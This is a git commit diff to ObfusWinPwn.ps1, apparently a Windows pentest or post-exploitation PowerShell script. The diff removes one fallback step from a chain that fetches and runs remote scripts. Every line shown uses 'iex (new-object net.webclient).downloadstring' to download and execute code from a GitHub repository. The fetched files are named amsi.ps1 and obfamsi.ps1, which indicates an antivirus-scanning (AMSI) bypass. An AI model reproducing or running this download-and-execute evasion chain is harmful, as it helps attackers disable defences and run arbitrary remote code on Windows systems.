27ec53bd4ab41cfb0d5d3f2bdcf21e8c77cbaa2e
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2020-06-04 11:43:38 +0200

    Update ObfusWinPwn.ps1

--- ObfusWinPwn.ps1
+++ ObfusWinPwn.ps1
@@ -2,10 +2,6 @@ iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com
 $string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1')
 If (-Not $string)
 {
-  $string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsicustom.ps1')
-}
-If (-Not $string)
-{
   iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/obfamsi.ps1')
   ShEEt
 }
